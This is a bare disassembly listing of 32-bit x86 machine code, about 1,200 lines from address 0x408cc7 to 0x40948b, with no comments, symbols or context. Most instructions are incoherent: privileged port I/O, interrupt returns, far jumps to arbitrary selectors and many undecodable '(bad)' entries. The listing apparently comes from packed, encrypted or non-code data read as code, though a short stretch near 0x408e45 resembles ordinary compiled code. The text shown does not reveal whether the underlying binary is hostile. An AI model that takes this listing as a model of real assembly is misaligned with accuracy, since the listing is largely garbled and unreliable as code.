  408cc7:	repz jge 0x408d17
  408cca:	sbb    edx,DWORD PTR [ebx+edx*2-0x17]
  408cce:	mov    ?,WORD PTR [esi+0x66d6261a]
  408cd4:	mov    BYTE PTR [eax+0x60d6265],bl
  408cda:	xchg   edx,eax
  408cdb:	fisubr DWORD PTR [edx+0x1193e5f0]
  408ce1:	sar    eax,cl
  408ce3:	dec    esi
  408ce4:	out    0x5b,al
  408ce6:	out    0x43,eax
  408ce8:	pushf  
  408ce9:	push   ebp
  408cea:	in     eax,dx
  408ceb:	or     al,0x56
  408ced:	iret   
  408cee:	rol    BYTE PTR [edi-0x55],0x9
  408cf2:	bnd jb 0x408ca8
  408cf5:	push   edx
  408cf6:	mov    esi,0x4632baed
  408cfb:	and    ebx,DWORD PTR [edi-0x15]
  408cfe:	xor    eax,0x5ef682a9
  408d03:	cmp    eax,DWORD PTR [edx]
  408d05:	test   al,ch
  408d07:	clc    
  408d08:	sub    dl,BYTE PTR [eax]
  408d0a:	cmp    DWORD PTR [eax],ebx
  408d0c:	xor    BYTE PTR [ebp+eiz*2+0x7b9dba4d],cl
  408d13:	sbb    eax,DWORD PTR [ebx+0x43a05780]
  408d19:	add    esi,ecx
  408d1b:	jmp    FWORD PTR ds:0xc09388d2
  408d21:	jle    0x408d50
  408d23:	mov    al,ds:0x4d07c953
  408d28:	mov    ds:0xfb14197b,eax
  408d2d:	shl    BYTE PTR [ecx+0x4544a6f9],cl
  408d33:	pusha  
  408d34:	xchg   ebx,eax
  408d35:	push   edi
  408d36:	push   cs
  408d37:	mov    ah,0xda
  408d39:	jnp    0x408d72
  408d3b:	fisttp QWORD PTR [edx+0x2c]
  408d3e:	mov    cl,0x3f
  408d40:	add    edi,DWORD PTR [edx]
  408d42:	es dec edx
  408d44:	sub    al,0x7c
  408d46:	adc    al,0x4d
  408d48:	enter  0xe2f7,0xa9
  408d4c:	sub    DWORD PTR [edx-0x60],ecx
  408d4f:	cdq    
  408d50:	iret   
  408d51:	nop
  408d52:	xchg   esp,eax
  408d53:	arpl   WORD PTR [ebx+eax*2-0x69],sp
  408d57:	lods   al,BYTE PTR ds:[esi]
  408d58:	mov    ds,WORD PTR cs:[ebx-0x17]
  408d5c:	fisttp DWORD PTR [ebx+0x67]
  408d5f:	jl     0x408daa
  408d61:	sub    al,0x9e
  408d63:	adc    DWORD PTR [edx+0x8],edi
  408d66:	sahf   
  408d67:	jp     0x408d29
  408d69:	cs xchg esi,eax
  408d6b:	(bad)  
  408d6c:	repnz add BYTE PTR ss:[edi],ah
  408d70:	and    esp,0xffffffb6
  408d73:	push   ds
  408d74:	dec    ebp
  408d75:	mov    eax,ds:0xa844210a
  408d7a:	hlt    
  408d7b:	lock jmp 0x8afb5ba5
  408d81:	dec    edx
  408d82:	inc    esi
  408d83:	(bad)  
  408d84:	jne    0x408d88
  408d86:	dec    esi
  408d87:	sbb    al,0xcb
  408d89:	mov    ebp,0xd1b86d93
  408d8e:	rep stos DWORD PTR es:[edi],eax
  408d90:	aas    
  408d91:	mov    ss,WORD PTR [edx]
  408d93:	test   al,0x85
  408d95:	xor    al,0x39
  408d97:	out    dx,eax
  408d98:	mov    al,0xae
  408d9a:	mov    dl,0x5d
  408d9c:	pop    esp
  408d9d:	or     DWORD PTR [edx],esp
  408d9f:	xchg   ebp,eax
  408da1:	mov    ebx,0x885fe5b2
  408da6:	pop    ebp
  408da7:	mov    al,0x3e
  408da9:	aam    0x85
  408dab:	idiv   DWORD PTR ds:0xfbf8ee40
  408db1:	pop    esp
  408db2:	jmp    0x9283:0xf2b63531
  408db9:	cs sar esi,cl
  408dbc:	jl     0x408e09
  408dbe:	sbb    BYTE PTR [ebp-0x3da00ab0],cl
  408dc4:	into   
  408dc5:	xchg   esp,eax
  408dc6:	inc    edi
  408dc7:	mov    WORD PTR [edx+0x7c],ss
  408dca:	(bad)  [edi-0x65]
  408dcd:	scas   eax,DWORD PTR es:[edi]
  408dce:	mov    dl,0x99
  408dd0:	sub    ebx,0x15
  408dd3:	add    eax,0x147f212b
  408dd8:	cmp    edx,edx
  408dda:	xor    eax,0xbfcd45f2
  408ddf:	stos   BYTE PTR es:[edi],al
  408de0:	add    al,0x46
  408de2:	out    0xa8,al
  408de4:	jno    0x408e5f
  408de6:	outs   dx,BYTE PTR ds:[esi]
  408de7:	fs bswap edi
  408dea:	and    eax,0x45b67149
  408def:	in     al,dx
  408df0:	jae    0x408d8e
  408df2:	push   eax
  408df3:	imul   ebp,DWORD PTR [esi],0xffffffb8
  408df6:	sbb    al,0xd7
  408df8:	jmp    0x65fb:0xfd7b4808
  408dff:	push   0x63630726
  408e04:	retf   0xb8c1
  408e07:	dec    ecx
  408e08:	mov    edx,DWORD PTR [edx+0x51]
  408e0b:	push   ebp
  408e0c:	sub    eax,0xc8e97b80
  408e11:	mov    cl,0x56
  408e13:	mov    bh,0xe8
  408e15:	shl    dh,1
  408e17:	mov    ecx,0xf4ac43d0
  408e1c:	dec    ebp
  408e1d:	or     al,0x7
  408e1f:	or     DWORD PTR [ecx-0x4e68a942],0xffffff95
  408e26:	cmp    esp,edi
  408e28:	outs   dx,BYTE PTR ds:[esi]
  408e29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e2a:	out    0xa2,eax
  408e2c:	ret    0x15d6
  408e2f:	mov    ebp,0x8022904
  408e34:	test   BYTE PTR [esp+ebx*1],bh
  408e37:	jecxz  0x408e3d
  408e39:	outs   dx,DWORD PTR ds:[esi]
  408e3a:	pop    edx
  408e3b:	mov    cl,0x43
  408e3d:	add    BYTE PTR [ebx+0x73],dh
  408e40:	int    0xf
  408e42:	lods   al,BYTE PTR ds:[esi]
  408e43:	rol    BYTE PTR [edx],1
  408e45:	mov    DWORD PTR [ebp+0x14],eax
  408e48:	mov    eax,DWORD PTR [esi]
  408e4a:	xor    DWORD PTR [ebp+0x14],edi
  408e4d:	shr    edx,0x2
  408e50:	mov    edx,DWORD PTR [esi+0x4]
  408e53:	xor    edx,edx
  408e55:	shl    eax,0x1e
  408e58:	or     edx,DWORD PTR [ebp+0x14]
  408e5b:	mov    DWORD PTR [ebp-0x28],edx
  408e5e:	mov    eax,DWORD PTR [ebp-0x24]
  408e61:	mov    eax,DWORD PTR [ebp-0x24]
  408e64:	jmp    0x409242
  408e69:	and    al,BYTE PTR [ebp-0x6d]
  408e6c:	pop    ss
  408e6d:	jb     0x408e35
  408e6f:	and    ah,BYTE PTR ds:0x7e10ec41
  408e75:	shl    DWORD PTR [ecx-0x1b],cl
  408e78:	stos   BYTE PTR es:[edi],al
  408e79:	cmp    dl,BYTE PTR [ecx+0x18]
  408e7c:	sbb    BYTE PTR [esi-0x26e7e7ee],bl
  408e82:	jl     0x408ebf
  408e84:	sub    ebp,ebp
  408e86:	pop    edi
  408e87:	(bad)  
  408e88:	sub    ah,BYTE PTR [ebx+0x2e566dd1]
  408e8e:	int    0x9b
  408e90:	and    DWORD PTR [ebx+edi*8-0x5e1c6c84],ebp
  408e97:	psllw  mm3,QWORD PTR fs:[ebx-0x47e38814]
  408e9f:	and    eax,DWORD PTR [edi-0x68]
  408ea2:	lea    eax,[edi-0xb70baa1]
  408ea8:	and    DWORD PTR [ecx+0x2c93f212],ecx
  408eae:	pop    esp
  408eaf:	je     0x408e32
  408eb1:	out    dx,eax
  408eb2:	fcomp  DWORD PTR [ebx]
  408eb4:	call   DWORD PTR [ecx]
  408eb6:	dec    esp
  408eb7:	cmp    dh,BYTE PTR [eax+0x784f164c]
  408ebd:	shr    esp,0xa6
  408ec0:	(bad)  
  408ec1:	cmp    BYTE PTR [ebp-0x308ed38f],bh
  408ec7:	rcl    BYTE PTR [edi+0x646e6042],0xc
  408ece:	lea    ecx,[edi-0x7c]
  408ed1:	adc    ebp,DWORD PTR [esi+0x54]
  408ed4:	call   0x5c4a:0x4f061388
  408edb:	inc    esp
  408edc:	fadd   QWORD PTR [edi-0xa]
  408edf:	fisttp WORD PTR [edi+0x53]
  408ee2:	xchg   ebp,eax
  408ee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ee4:	or     DWORD PTR [ebx],ebx
  408ee6:	and    eax,0x48cdd62a
  408eeb:	sub    al,0x7c
  408eed:	ins    BYTE PTR es:[edi],dx
  408eee:	clc    
  408eef:	aas    
  408ef0:	repnz lea ebp,[ecx+0x1e9ffc52]
  408ef7:	jno    0x408e9f
  408ef9:	jns    0x408f5a
  408efb:	mov    WORD PTR ds:0x59bdb52e,fs
  408f01:	enter  0x8fe7,0xbd
  408f05:	or     DWORD PTR [edx],0x2e
  408f08:	pop    esi
  408f09:	rcr    DWORD PTR [edi-0x5f],1
  408f0c:	or     al,BYTE PTR [ebx+ecx*8-0x40470181]
  408f13:	scas   eax,DWORD PTR es:[edi]
  408f14:	jo     0x408f64
  408f16:	add    cl,ah
  408f18:	clc    
  408f19:	in     eax,dx
  408f1a:	fwait
  408f1b:	mov    ch,0x65
  408f1d:	ins    DWORD PTR es:[edi],dx
  408f1e:	nop
  408f1f:	mov    al,0x46
  408f21:	shr    edx,0x7f
  408f24:	lods   al,BYTE PTR ds:[esi]
  408f25:	iret   
  408f26:	xor    DWORD PTR [edx+0x63],0xffffffbc
  408f2a:	xor    al,0x54
  408f2c:	retf   
  408f2d:	mov    eax,ds:0xab90ed9d
  408f32:	jae    0x408f60
  408f34:	jb     0x408eed
  408f36:	xchg   DWORD PTR [eax+0x56f4d253],esi
  408f3c:	ror    DWORD PTR [esi-0x71],0x30
  408f40:	mov    DWORD PTR [ecx+ecx*1+0x19],edx
  408f44:	addr16 dec esi
  408f46:	das    
  408f47:	(bad)  
  408f48:	sbb    ebp,DWORD PTR [esi-0x37]
  408f4b:	or     al,BYTE PTR [esi]
  408f4d:	mov    al,ds:0x56934e5a
  408f52:	mov    ds:0xb2764f6e,al
  408f57:	xcrypt-cfb 
  408f5a:	dec    ebp
  408f5b:	mov    al,ds:0xd1a7ed28
  408f60:	add    DWORD PTR [eax],ecx
  408f62:	push   ecx
  408f63:	or     al,BYTE PTR [ebx]
  408f65:	pop    ds
  408f66:	loop   0x408f03
  408f68:	xor    edi,edi
  408f6a:	cmp    esi,DWORD PTR [edi]
  408f6c:	shr    BYTE PTR [ecx+0x3e],cl
  408f6f:	pusha  
  408f70:	outs   dx,DWORD PTR ds:[esi]
  408f71:	pop    esp
  408f72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f73:	(bad)  
  408f74:	(bad)  
  408f76:	mov    eax,0x16c9e1d0
  408f7b:	mov    bl,0x8
  408f7d:	mov    esp,0x51de25bd
  408f82:	call   esp
  408f84:	or     edi,DWORD PTR [ebx-0x4d]
  408f87:	(bad)  
  408f88:	mov    edx,0x9f2793c2
  408f8d:	ja     0x408f46
  408f8f:	or     DWORD PTR [esi+esi*8],esp
  408f92:	cld    
  408f93:	add    edx,DWORD PTR [edi+0x1f]
  408f96:	cmp    BYTE PTR [ebx],ch
  408f98:	dec    eax
  408f99:	(bad)  [ecx+ebx*2-0x35792821]
  408fa0:	or     eax,0x6a99eef
  408fa5:	pop    edi
  408fa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fa7:	popf   
  408fa8:	add    cl,BYTE PTR [edi+0x33]
  408fab:	xor    BYTE PTR [edx+edx*4],cl
  408fae:	(bad)  
  408faf:	and    al,BYTE PTR [eax]
  408fb1:	jg     0x408f8e
  408fb3:	loope  0x408f5e
  408fb5:	pop    edx
  408fb6:	jp     0x408fa7
  408fb8:	xchg   ecx,eax
  408fb9:	dec    esi
  408fba:	mov    esi,0xb9f7ebef
  408fbf:	jg     0x408fcf
  408fc1:	xor    DWORD PTR [eax-0x250b1cf],ebp
  408fc7:	adc    eax,0x46bb6f3e
  408fcc:	inc    edx
  408fcd:	mov    al,gs:0xcfe07aad
  408fd3:	jnp    0x408fa7
  408fd5:	add    cl,ch
  408fd7:	rcl    eax,0x10
  408fda:	pop    esi
  408fdb:	pop    ebx
  408fdc:	mov    eax,0xb651c8b8
  408fe1:	icebp  
  408fe2:	cdq    
  408fe3:	retf   
  408fe4:	icebp  
  408fe5:	xor    ax,0xcecf
  408fe9:	adc    ch,dh
  408feb:	jo     0x408f6f
  408fed:	or     BYTE PTR [edx-0x7e159648],dl
  408ff3:	dec    ebx
  408ff4:	fisttp QWORD PTR ds:0x39d09e3b
  408ffa:	je     0x40906a
  408ffc:	in     eax,dx
  408ffd:	out    dx,eax
  408ffe:	out    dx,al
  408fff:	ss aam 0x81
  409002:	jl     0x409062
  409004:	xchg   esp,eax
  409005:	jno    0x408fb8
  409007:	and    ebp,edi
  409009:	jp     0x408fdf
  40900b:	in     al,0xcd
  40900d:	adc    ch,BYTE PTR [ebp-0x40]
  409010:	inc    edi
  409011:	pop    edi
  409012:	add    al,0x10
  409014:	outs   dx,BYTE PTR ds:[esi]
  409015:	pop    ebx
  409016:	fidiv  DWORD PTR [eax+edi*1+0x47]
  40901a:	je     0x40902e
  40901c:	in     al,dx
  40901d:	cwde   
  40901e:	mov    ebp,DWORD PTR [ecx]
  409020:	push   0xf04b0c0
  409025:	ins    DWORD PTR es:[edi],dx
  409026:	imul   edi,DWORD PTR [esi+0x237baa78],0xffffffcf
  40902d:	adc    al,0x85
  40902f:	mov    al,ds:0x87ed495e
  409034:	or     al,BYTE PTR [ebx-0x3bbdf83b]
  40903a:	pop    ebp
  40903b:	dec    edx
  40903c:	(bad)  
  40903d:	test   al,0x49
  40903f:	pop    edi
  409040:	pop    esp
  409041:	gs fcmovne st,st(3)
  409044:	jecxz  0x4090b2
  409046:	adc    al,0xae
  409048:	outs   dx,BYTE PTR ds:[esi]
  409049:	cmp    BYTE PTR [ecx-0x6d],0x6d
  40904d:	cwde   
  40904e:	fldcw  WORD PTR [edi+0x58]
  409051:	add    DWORD PTR ds:0x89b2a81c,0x35
  409058:	out    dx,eax
  409059:	or     eax,0x68ff41bb
  40905e:	shr    BYTE PTR ds:0x95065652,1
  409064:	(bad)  
  409066:	mov    eax,0x731cfc68
  40906b:	pusha  
  40906c:	test   al,0x2b
  40906e:	lods   eax,DWORD PTR ds:[esi]
  40906f:	inc    esp
  409070:	mov    cl,0xd5
  409072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409073:	les    ecx,FWORD PTR [edx]
  409075:	mov    dl,0x62
  409077:	or     edi,DWORD PTR [edi-0x14a92863]
  40907d:	popf   
  40907e:	and    eax,0x4139b617
  409083:	dec    edi
  409084:	je     0x409024
  409086:	adc    DWORD PTR [ebp+0x50],ecx
  409089:	(bad)  
  40908a:	push   eax
  40908b:	xchg   edx,eax
  40908c:	iret   
  40908d:	popa   
  40908e:	pushf  
  40908f:	sub    bh,BYTE PTR [ecx-0x9247950]
  409095:	dec    ebp
  409096:	daa    
  409097:	bound  ebp,QWORD PTR [ebp+0x4b]
  40909a:	or     BYTE PTR [ebp+0x5d],al
  40909d:	add    al,0xcc
  40909f:	retfw  0xaea
  4090a3:	sbb    ah,BYTE PTR [edi+0x9]
  4090a6:	sub    esp,edi
  4090a8:	mov    ss:0x940cb8f5,al
  4090ae:	pusha  
  4090af:	(bad)  
  4090b0:	lock and eax,0x510be761
  4090b6:	not    BYTE PTR [edx]
  4090b8:	sbb    eax,0xcd31e3a4
  4090bd:	mov    edx,0x6a6d3c2b
  4090c2:	sar    DWORD PTR [edi+0x6e],0xb4
  4090c6:	mov    ds:0xbdc01b03,al
  4090cb:	aad    0x12
  4090cd:	rol    BYTE PTR [eax+0x1d95e622],0x2e
  4090d4:	xchg   esi,eax
  4090d5:	test   eax,0xda947914
  4090da:	cli    
  4090db:	fist   WORD PTR [ebp+0x5fe2143]
  4090e1:	jbe    0x4090ea
  4090e3:	clc    
  4090e4:	push   0xda6c20d1
  4090e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090ea:	xlat   BYTE PTR ds:[ebx]
  4090eb:	(bad)  
  4090ec:	jno    0x409074
  4090ee:	mov    ch,0x3
  4090f0:	sub    DWORD PTR [ecx],ebp
  4090f2:	out    dx,eax
  4090f3:	push   esi
  4090f4:	push   ds
  4090f5:	pop    ebp
  4090f6:	or     BYTE PTR [ebx-0x572aed77],al
  4090fc:	dec    esi
  4090fd:	aas    
  4090fe:	mov    edx,0xd5c28f2f
  409104:	add    edi,DWORD PTR [ebx]
  409106:	inc    ecx
  409107:	fldcw  WORD PTR [ecx-0x23]
  40910a:	mov    BYTE PTR [edi+0x33f19a85],bh
  409110:	mov    esi,0x33ea110
  409115:	dec    ebx
  409116:	inc    eax
  409117:	jne    0x409167
  409119:	ret    
  40911a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40911b:	ins    DWORD PTR es:[edi],dx
  40911c:	mov    ebx,0xa812f8a4
  409121:	scas   al,BYTE PTR es:[edi]
  409122:	in     al,0xb0
  409124:	mov    edx,DWORD PTR es:[esi]
  409127:	(bad)  
  409128:	fsubr  st,st(1)
  40912a:	mov    al,0xfb
  40912c:	xor    BYTE PTR ds:[esi],0xb2
  409130:	push   esi
  409131:	lods   eax,DWORD PTR ds:[esi]
  409132:	sahf   
  409133:	or     al,0x4e
  409135:	push   esi
  409136:	fstp   st(3)
  409138:	push   ecx
  409139:	loop   0x4091a8
  40913b:	mul    DWORD PTR [eax+0x25be6dc3]
  409141:	lods   al,BYTE PTR ds:[esi]
  409142:	jae    0x409131
  409144:	xor    eax,0xc47ae628
  409149:	mov    BYTE PTR [eax+0x1a1ecd78],dh
  40914f:	fild   DWORD PTR [eax-0x32327e0b]
  409155:	adc    ebx,0x61843640
  40915b:	jno    0x409195
  40915d:	jb     0x4091ae
  40915f:	sub    al,BYTE PTR [edx-0x5c]
  409162:	adc    bh,cl
  409164:	popa   
  409165:	add    edi,DWORD PTR [ebp+0x3d11e047]
  40916b:	fbstp  TBYTE PTR [ebx-0x10a4e169]
  409171:	imul   bh
  409173:	fisubr WORD PTR ds:0x8f43ae2f
  409179:	dec    edx
  40917a:	xchg   ebx,eax
  40917b:	das    
  40917c:	jmp    0x409136
  40917e:	mov    ecx,0xb62c6aee
  409183:	mov    ds:0xe61ac466,al
  409188:	ror    DWORD PTR [edi-0x468081eb],cl
  40918e:	inc    ebx
  40918f:	inc    ebp
  409190:	pop    eax
  409191:	add    bl,BYTE PTR [esi+0x3ef2f7f3]
  409197:	jecxz  0x409152
  409199:	std    
  40919a:	cli    
  40919b:	mov    al,ds:0x65591a43
  4091a0:	dec    esp
  4091a1:	test   al,0xfd
  4091a3:	es pop es
  4091a5:	rcl    esp,0x55
  4091a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091a9:	ja     0x4091fc
  4091ab:	pop    es
  4091ac:	xchg   edi,esi
  4091ae:	add    DWORD PTR [ecx+0x472784b3],ebp
  4091b4:	sbb    bl,BYTE PTR [edi+0x2b]
  4091b7:	fistp  WORD PTR ds:0x18eebe90
  4091bd:	cmp    bl,BYTE PTR [eax-0x58]
  4091c0:	dec    esi
  4091c1:	xchg   cl,bl
  4091c3:	sub    eax,0x50918034
  4091c8:	or     al,BYTE PTR [eax+0x17]
  4091cb:	pop    edx
  4091cc:	pop    ss
  4091cd:	lahf   
  4091ce:	shl    DWORD PTR [eax-0x52],cl
  4091d1:	ins    BYTE PTR es:[edi],dx
  4091d2:	dec    ebp
  4091d3:	jg     0x4091c5
  4091d5:	enter  0x33ff,0xff
  4091d9:	std    
  4091da:	and    al,0xd3
  4091dc:	mov    ds:0xd18638a9,eax
  4091e1:	push   edx
  4091e2:	(bad)  
  4091e4:	add    ecx,DWORD PTR [eax]
  4091e6:	push   es
  4091e7:	sahf   
  4091e8:	pop    edx
  4091e9:	mov    cs,WORD PTR [edi+ebp*8]
  4091ec:	pop    ss
  4091ed:	retf   0x2f7a
  4091f0:	gs (bad) 
  4091f2:	fisttp WORD PTR [edx]
  4091f4:	xchg   BYTE PTR [eax-0x1],bl
  4091f7:	push   esp
  4091f8:	inc    esp
  4091f9:	icebp  
  4091fa:	and    dh,BYTE PTR [esi+0x25]
  4091fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091fe:	jp     0x4091da
  409200:	inc    esp
  409201:	test   al,0xbf
  409203:	xchg   esp,eax
  409204:	test   al,0xd2
  409206:	xor    BYTE PTR [esi-0x1b],0xa4
  40920a:	push   esi
  40920b:	cmp    DWORD PTR [ebp+0x32],0x186b4a9b
  409212:	inc    ecx
  409213:	div    BYTE PTR [ebp+0x12]
  409216:	xor    esp,ecx
  409218:	neg    ebp
  40921a:	scas   eax,DWORD PTR es:[edi]
  40921b:	jl     0x4091d4
  40921d:	mov    esi,0xf576e859
  409222:	test   DWORD PTR [edx+0x5],edi
  409225:	or     eax,0xa200d34b
  40922a:	mov    dl,0x2
  40922c:	push   eax
  40922d:	out    0x2c,eax
  40922f:	jno    0x4091f4
  409231:	out    0xe9,eax
  409233:	mov    edx,0x8bde8078
  409238:	push   ebp
  409239:	mov    edi,0x4dcafe84
  40923e:	int    0xa9
  409240:	pop    edi
  409241:	in     al,0x33
  409243:	ror    BYTE PTR [edi],cl
  409245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409246:	ret    0x3302
  409249:	ror    DWORD PTR [ecx-0x2616f3ab],1
  40924f:	add    eax,DWORD PTR [eax]
  409251:	add    dl,ah
  409253:	and    eax,0xea26ea26
  409258:	sbb    bl,BYTE PTR ds:0x70a1617f
  40925e:	and    DWORD PTR [edi+0x49c0aa55],esp
  409264:	sbb    BYTE PTR [eax],bl
  409266:	sahf   
  409267:	adc    bl,BYTE PTR [eax]
  409269:	sbb    BYTE PTR [ecx+0x23],ah
  40926c:	std    
  40926d:	daa    
  40926e:	xchg   esp,eax
  40926f:	sub    bl,BYTE PTR [edi-0x2f7f3106]
  409275:	popf   
  409276:	cmp    eax,0xf78c0b09
  40927b:	stc    
  40927c:	leave  
  40927d:	mov    cl,0x87
  40927f:	jb     0x4092c1
  409281:	in     eax,0xcd
  409283:	sar    cl,cl
  409285:	mov    bl,0xb8
  409287:	fwait
  409288:	push   0x6356f50a
  40928d:	inc    ebp
  40928e:	push   ebx
  40928f:	mov    ebx,0xf588553f
  409294:	fisubr DWORD PTR [eax+0x7b21278c]
  40929a:	inc    esp
  40929b:	out    dx,al
  40929c:	sbb    DWORD PTR [eax+0x681c1cd9],edi
  4092a2:	ja     0x40925c
  4092a4:	lods   al,BYTE PTR ds:[esi]
  4092a5:	xor    al,0x71
  4092a7:	adc    ch,ah
  4092a9:	inc    eax
  4092aa:	stos   DWORD PTR es:[edi],eax
  4092ab:	mov    ebx,0x82f9d0dd
  4092b0:	(bad)  
  4092b1:	out    0xba,al
  4092b3:	xor    eax,0x58df578b
  4092b8:	ret    0x22a2
  4092bb:	add    esi,DWORD PTR ds:[esi+0x18]
  4092bf:	mov    al,ds:0x1d5af499
  4092c4:	(bad)  
  4092c5:	xchg   edi,eax
  4092c6:	test   BYTE PTR [ecx+0x512ffc84],ch
  4092cc:	sti    
  4092cd:	nop
  4092ce:	cmp    eax,0x679ce23c
  4092d3:	out    0xd1,al
  4092d5:	shl    BYTE PTR [edx+ebp*4],0x1f
  4092d9:	in     al,dx
  4092da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092db:	xor    al,0xec
  4092dd:	fbld   TBYTE PTR [edx+0x36a9d7a]
  4092e3:	test   eax,0x88c1ba8b
  4092e8:	test   BYTE PTR [ecx+edi*1+0x14],dl
  4092ec:	fcmove st,st(3)
  4092ee:	es dec ecx
  4092f0:	fldcw  WORD PTR [eiz*2+0x381d6826]
  4092f7:	pop    es
  4092f8:	mov    al,BYTE PTR [ebx-0x30]
  4092fb:	inc    edi
  4092fc:	push   ebp
  4092fd:	ret    0x6dea
  409300:	lock push 0xffffffc6
  409303:	jmp    0x409350
  409305:	sub    DWORD PTR [ecx-0x21],edx
  409308:	shl    cl,cl
  40930a:	inc    esp
  40930b:	inc    ebp
  40930c:	dec    esp
  40930d:	xchg   ecx,eax
  40930e:	repnz shl DWORD PTR [edi+0x6c84791c],0xc3
  409316:	sbb    DWORD PTR [eax+0x2a],ebp
  409319:	(bad)  
  40931a:	and    BYTE PTR ds:0xda73bea0,ch
  409320:	gs jo  0x409330
  409323:	jg     0x40931d
  409325:	pop    sp
  409327:	pop    es
  409328:	adc    bh,BYTE PTR fs:[edi+ebp*8-0x780056b3]
  409330:	mov    esi,gs
  409332:	adc    eax,0xb0e5231
  409337:	icebp  
  409338:	pop    ss
  409339:	mov    cl,0xe8
  40933b:	cmc    
  40933c:	hlt    
  40933d:	push   ds
  40933e:	mov    bl,0xbc
  409340:	rcl    DWORD PTR [ebp+0x17bcb594],0xac
  409347:	xchg   DWORD PTR [ebp-0x15],ebx
  40934a:	div    DWORD PTR [ecx]
  40934c:	mov    bh,0xa1
  40934e:	push   es
  40934f:	push   ds
  409350:	xchg   BYTE PTR [esi+0x3a],ch
  409353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409354:	and    al,0xdb
  409356:	mov    bl,0x2a
  409358:	ficomp WORD PTR [ecx-0x25eb0f14]
  40935e:	(bad)  
  40935f:	fnstsw WORD PTR [ecx-0x6d]
  409362:	sbb    ebp,DWORD PTR [ebp+0x58cc801]
  409368:	cwde   
  409369:	inc    DWORD PTR [ecx+0x46]
  40936c:	repz fs pusha 
  40936f:	jo     0x4093d7
  409371:	in     eax,dx
  409372:	sub    al,0xd2
  409374:	out    dx,eax
  409375:	mov    ebx,0x71a6e141
  40937a:	inc    esp
  40937b:	stc    
  40937c:	adc    BYTE PTR [edx+0x535a5f7d],bl
  409382:	pop    ebp
  409383:	rcr    DWORD PTR [ebx+0x19],0xf6
  409387:	std    
  409388:	pusha  
  409389:	scas   al,BYTE PTR es:[edi]
  40938a:	and    eax,0x1853949c
  40938f:	outs   dx,DWORD PTR ds:[esi]
  409390:	add    esi,0x7
  409393:	lahf   
  409394:	ja     0x4093df
  409396:	(bad)  
  409397:	fxch   st(7)
  409399:	and    bl,cl
  40939b:	(bad)  
  40939c:	xor    esp,DWORD PTR [edx-0x32]
  40939f:	pushf  
  4093a0:	(bad)  
  4093a1:	push   eax
  4093a2:	popf   
  4093a3:	aam    0x93
  4093a5:	pusha  
  4093a6:	xchg   esi,eax
  4093a7:	and    BYTE PTR [edx],al
  4093a9:	or     eax,0xcfec8396
  4093ae:	dec    ebx
  4093af:	scas   al,BYTE PTR es:[edi]
  4093b0:	fistp  WORD PTR [ebx]
  4093b2:	out    dx,al
  4093b3:	mov    cl,0xd0
  4093b5:	scas   eax,DWORD PTR es:[edi]
  4093b6:	inc    ebx
  4093b7:	mov    dl,0x9e
  4093b9:	xchg   ebp,eax
  4093ba:	lods   al,BYTE PTR ds:[esi]
  4093bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093bc:	shl    DWORD PTR [edi-0x7ea62942],1
  4093c2:	mov    ds:0x5b408df8,al
  4093c7:	(bad)  
  4093c8:	hlt    
  4093c9:	jmp    0x409434
  4093cb:	add    BYTE PTR [esi],bl
  4093cd:	icebp  
  4093ce:	dec    eax
  4093cf:	js     0x409362
  4093d1:	mov    ecx,0x708eb0c8
  4093d6:	fs es int 0x32
  4093da:	xchg   ebp,eax
  4093db:	add    DWORD PTR [esi+0x75],esp
  4093de:	lock adc eax,0xfa2d5af9
  4093e4:	inc    edi
  4093e5:	mov    edx,0x97a104a
  4093ea:	pop    eax
  4093eb:	fidiv  WORD PTR [edx+0xbd64bf0]
  4093f1:	fsub   DWORD PTR [edi]
  4093f3:	dec    edx
  4093f4:	rcl    BYTE PTR [edx],cl
  4093f6:	ja     0x4093b4
  4093f8:	lds    ebx,FWORD PTR [ebx+ebp*2-0x10]
  4093fc:	jg     0x409407
  4093fe:	add    bh,ah
  409400:	pusha  
  409401:	dec    edx
  409402:	mov    ebp,0x27fe52ab
  409407:	sub    ebx,esp
  409409:	ror    cl,1
  40940b:	cdq    
  40940c:	mov    DWORD PTR ds:0x14def4bb,eax
  409412:	mov    dl,0x12
  409414:	mov    al,0x62
  409416:	shl    dl,1
  409418:	nop
  409419:	pop    edi
  40941a:	loope  0x4093a6
  40941c:	mov    eax,ds:0x12fd34a
  409421:	or     ecx,esp
  409423:	outs   dx,DWORD PTR ds:[esi]
  409424:	lock inc ebp
  409426:	or     BYTE PTR [ecx-0x5b],cl
  409429:	push   cs
  40942a:	mov    eax,ds:0xdacf67bb
  40942f:	xchg   esp,eax
  409430:	pop    ds
  409431:	jl     0x409403
  409433:	push   ebp
  409434:	push   edi
  409435:	lock (bad) 
  409438:	mov    edi,0x80d4a349
  40943d:	mov    edx,0xb88df1fa
  409442:	dec    edx
  409443:	add    ah,dh
  409445:	(bad)
  409448:	ds mov eax,0x6883e9eb
  40944e:	xchg   bl,cl
  409450:	jno    0x4094c2
  409452:	pushw  0x95a6
  409456:	cwde   
  409457:	in     eax,0x91
  409459:	sub    edi,DWORD PTR [esi]
  40945b:	and    edx,DWORD PTR [esi-0xe]
  40945e:	mov    al,0x3e
  409460:	in     eax,dx
  409461:	into   
  409462:	es int3 
  409464:	xchg   edi,eax
  409465:	out    0x64,al
  409467:	not    BYTE PTR [esi+0x13]
  40946a:	cmp    BYTE PTR [esi],dl
  40946c:	bnd jns 0x4094e7
  40946f:	jge    0x40949f
  409471:	adc    BYTE PTR [edx],dh
  409473:	sub    esi,DWORD PTR [eax]
  409475:	jae    0x409443
  409477:	and    al,0x83
  409479:	lock js 0x4094b5
  40947c:	sbb    DWORD PTR [ebx+0x35305793],ebx
  409482:	pop    ebx
  409483:	ficom  WORD PTR [esi+0x55]
  409486:	mov    ebp,0x8dcbb0bf
  40948b:	stos   BYTE PTR es:[edi],al
